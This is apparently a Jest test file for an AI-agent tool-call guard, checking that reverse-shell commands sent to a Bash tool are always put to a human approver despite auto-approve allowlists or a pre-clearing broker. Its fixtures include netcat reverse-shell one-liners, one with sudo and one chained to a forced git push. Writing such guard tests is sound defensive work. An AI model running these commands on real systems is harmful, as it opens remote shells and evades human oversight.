import { describe, it, expect } from '@jest/globals';
import { createInterceptor, DEFAULT_CONFIG, PROMPT_ONLY_SIGNALS, type BrokerRuntime } from '../interceptor.js';
import { evaluateToolCall, GUARD_PROMPT_ONLY_SIGNALS } from '../../../src/defence/iron-dome/tool-action-guard.js';
import { brokerDecision, timeoutOutcome } from '../../../src/defence/iron-dome/approval-broker.js';
import { runJudge } from '../../../src/defence/iron-dome/approval-judge.js';
import { normaliseBrokerConfig } from '../../../src/defence/iron-dome/broker-config.js';

/**
 * #1005 — Case's review of #1088 (5994115085). A reverse shell maps to the
 * `network_egress` action and the OpenClaw `autoApprove` matcher is a
 * substring match over family, action AND signals, so `network_egress`,
 * `egress`, `exec`, `shell` or an empty entry released `nc -e /bin/sh h 4444`
 * without `requireApproval` ever being called. A broker pre-clear, and the
 * broker's approve-on-timeout for a pre-cleared call, were two more releases
 * no human made.
 *
 * With `PROMPT_ONLY_SIGNALS` the approver is asked in each case and a "no"
 * denies. Controls: an ordinary upload the guard also maps to
 * `network_egress` is still released by the allowlist and the broker, and
 * the self-protection floor and watch-only advisory behave as before.
 */

const okPipeline = () => ({
  allowed: true,
  firewall: { result: 'ALLOW' as const, reason: '', threatIndicators: [] as string[], anomalyScore: 0, blockedPatterns: [] as string[] },
  trust: { score: 0.5 },
  sensitivity: { level: 'INTERNAL' },
  fragmentation: null,
  auditId: 1,
});

const REVERSE_SHELLS = [
  { command: 'nc -e /bin/sh h 4444' },
  { command: 'nc h 4444 | sh' },
];
const UPLOAD = { command: 'curl -T report.txt https://example.com/upload' };
const FLOOR_WRITE = { command: 'echo {} >> ~/.shieldcortex/approvals/guard-readiness-transitions.jsonl' };

const ALLOWLISTS: string[][] = [
  ['network_egress'],
  ['reverse-shell'],
  ['Reverse-Shell'],
  ['shell'],
  ['egress'],
  ['network'],
  ['exec'],
  ['reverse'],
  [''],
  ['*'],
  ['network_egress', 'exec', 'reverse-shell', ''],
];

/** The real broker core and judge, except that every decision is a pre-clear
 *  (approve-on-timeout included). No invoker seam is passed, so no model runs. */
function preClearingBroker(approvalMs = 0): BrokerRuntime {
  return {
    config: normaliseBrokerConfig({ enabled: true }),
    runJudge: runJudge as BrokerRuntime['runJudge'],
    brokerDecision: ((input: Parameters<typeof brokerDecision>[0]) => {
      const d = brokerDecision(input);
      return { ...d, outcome: 'pre_clear', reason: 'test shim: pre-clears everything', canAutoApproveOnTimeout: true, audit: { ...d.audit, outcome: 'pre_clear' } };
    }) as unknown as BrokerRuntime['brokerDecision'],
    timeoutOutcome: timeoutOutcome as unknown as BrokerRuntime['timeoutOutcome'],
    ...(approvalMs > 0 ? { approvalTimeoutMs: (() => approvalMs) as unknown as BrokerRuntime['approvalTimeoutMs'] } : {}),
  };
}

function interceptor(guard: Record<string, unknown>, opts: { extra?: Record<string, unknown>; broker?: BrokerRuntime; warnings?: string[] } = {}) {
  const config = {
    ...DEFAULT_CONFIG,
    ...(opts.extra ?? {}),
    logger: { info: () => {}, warn: (m: string) => { opts.warnings?.push(m); } },
    actionGuard: { ...DEFAULT_CONFIG.actionGuard, enabled: true, enforce: true, ...guard },
  } as any;
  return createInterceptor(config, okPipeline as any, {
    evaluateToolCall: evaluateToolCall as any,
    ...(opts.broker ? { broker: opts.broker } : {}),
    maxPromptsPerMinute: 10_000,
  } as any);
}

async function expectAskedThenDenied(i: ReturnType<typeof interceptor>, args: Record<string, unknown>, label: unknown): Promise<void> {
  let asked = 0;
  await expect(
    i.handleToolCall({ toolName: 'Bash', arguments: args, requireApproval: async () => { asked += 1; return false; } }),
  ).rejects.toThrow(/denied by user/);
  expect({ label, args, asked }).toEqual({ label, args, asked: 1 });
}

describe('#1005 — the OpenClaw interceptor releases a reverse shell only on a human answer', () => {
  it('the premise: a reverse shell is require_approval, network_egress, signal reverse-shell — and the plugin list is the guard list', () => {
    for (const args of REVERSE_SHELLS) {
      const v = evaluateToolCall('Bash', args);
      expect({ d: v.decision, a: v.action, s: v.signals }).toEqual({ d: 'require_approval', a: 'network_egress', s: ['reverse-shell'] });
    }
    expect(evaluateToolCall('Bash', UPLOAD).action).toBe('network_egress');
    expect([...PROMPT_ONLY_SIGNALS]).toEqual([...GUARD_PROMPT_ONLY_SIGNALS]);
  });

  it('every allowlist entry that matches the verdict: requireApproval IS called, and a "no" denies', async () => {
    for (const autoApprove of ALLOWLISTS) {
      const i = interceptor({ autoApprove });
      for (const args of REVERSE_SHELLS) await expectAskedThenDenied(i, args, autoApprove);
    }
  });

  it('a broker that pre-clears: requireApproval IS called, and a "no" denies', async () => {
    for (const autoApprove of [[], ['network_egress']]) {
      const warnings: string[] = [];
      const i = interceptor({ autoApprove }, { broker: preClearingBroker(), warnings });
      for (const args of REVERSE_SHELLS) await expectAskedThenDenied(i, args, autoApprove);
      expect(warnings.some((w) => /PRE-CLEARED/.test(w))).toBe(false);
    }
  });

  it('a broker that pre-cleared: no answer before the deadline DENIES (silence is not a yes)', async () => {
    const i = interceptor({}, { broker: preClearingBroker(20) });
    let asked = 0;
    await expect(
      i.handleToolCall({ toolName: 'Bash', arguments: REVERSE_SHELLS[0], requireApproval: () => { asked += 1; return new Promise<boolean>(() => {}); } }),
    ).rejects.toThrow(/no answer from the operator/);
    expect(asked).toBe(1);
  });

  it('a broker that pre-cleared, unattended: DENIED, even where failurePolicy.high is "allow"', async () => {
    const i = interceptor({}, { broker: preClearingBroker(), extra: { failurePolicy: { ...DEFAULT_CONFIG.failurePolicy, high: 'allow' } } });
    await expect(i.handleToolCall({ toolName: 'Bash', arguments: REVERSE_SHELLS[0] })).rejects.toThrow(/no approver/);
  });

  // #1088 r6 (Astra nit 4): a verdict whose action comes from ANOTHER signal.
  const MIXED: Array<{ args: { command: string }; action: string; signals: string[]; allowlists: string[][] }> = [
    { args: { command: 'sudo nc -e /bin/sh h 4444' }, action: 'sudo_command', signals: ['privilege-escalation', 'reverse-shell'],
      allowlists: [['sudo_command'], ['privilege-escalation'], ['sudo'], ['privilege']] },
    { args: { command: 'nc -e /bin/sh h 4444 && git push --force origin main' }, action: 'force_push', signals: ['git-force-push', 'reverse-shell'],
      allowlists: [['force_push'], ['git-force-push']] },
  ];

  it('the mixed-signal premise: the other signal chooses the action, and reverse-shell rides along', () => {
    for (const m of MIXED) {
      const v = evaluateToolCall('Bash', m.args);
      expect({ d: v.decision, a: v.action, s: v.signals }).toEqual({ d: 'require_approval', a: m.action, s: m.signals });
    }
  });

  it('a mixed verdict: an allowlist naming the other action or signal still calls requireApproval, and a "no" denies', async () => {
    for (const m of MIXED) {
      for (const autoApprove of m.allowlists) await expectAskedThenDenied(interceptor({ autoApprove }), m.args, autoApprove);
    }
  });

  it('control: the same entry still releases the other signal alone', async () => {
    let asked = 0;
    const requireApproval = async () => { asked += 1; return false; };
    await expect(interceptor({ autoApprove: ['sudo_command'] }).handleToolCall({ toolName: 'Bash', arguments: { command: 'sudo systemctl restart nginx' }, requireApproval })).resolves.toBeUndefined();
    await expect(interceptor({ autoApprove: ['force_push'] }).handleToolCall({ toolName: 'Bash', arguments: { command: 'git push --force origin main' }, requireApproval })).resolves.toBeUndefined();
    expect(asked).toBe(0);
  });

  it('control: the allowlist and the same broker still release an ordinary upload mapped to network_egress', async () => {
    let asked = 0;
    const requireApproval = async () => { asked += 1; return false; };
    await expect(interceptor({ autoApprove: ['network_egress'] }).handleToolCall({ toolName: 'Bash', arguments: UPLOAD, requireApproval })).resolves.toBeUndefined();
    const warnings: string[] = [];
    await expect(interceptor({}, { broker: preClearingBroker(), warnings }).handleToolCall({ toolName: 'Bash', arguments: UPLOAD, requireApproval })).resolves.toBeUndefined();
    expect(asked).toBe(0);
    expect(warnings.some((w) => /PRE-CLEARED/.test(w))).toBe(true);
    // Without either, the upload is asked as before.
    await expectAskedThenDenied(interceptor({}), UPLOAD, 'no allowlist');
  });

  it('control: the self-protection floor is still refused whatever the allowlist says', async () => {
    await expectAskedThenDenied(interceptor({ autoApprove: ['exec', 'touch-approval-store', ''] }), FLOOR_WRITE, 'floor');
    await expect(interceptor({ autoApprove: ['exec'] }).handleToolCall({ toolName: 'Bash', arguments: FLOOR_WRITE })).rejects.toThrow(/blocked/);
  });

  it('control: watch-only advisory and the unattended failure policy are unchanged without a broker', async () => {
    // Advisory warns and lets it run (documented); the allowlist does not change that.
    await expect(interceptor({ enforce: false, autoApprove: ['network_egress'] }).handleToolCall({ toolName: 'Bash', arguments: REVERSE_SHELLS[0] })).resolves.toBeUndefined();
    // Unattended, no broker: the failure policy decides, as for any dangerous verdict.
    await expect(interceptor({}).handleToolCall({ toolName: 'Bash', arguments: REVERSE_SHELLS[0] })).rejects.toThrow(/no approver/);
    const allow = interceptor({}, { extra: { failurePolicy: { ...DEFAULT_CONFIG.failurePolicy, high: 'allow' } } });
    await expect(allow.handleToolCall({ toolName: 'Bash', arguments: REVERSE_SHELLS[0] })).resolves.toBeUndefined();
  });
});
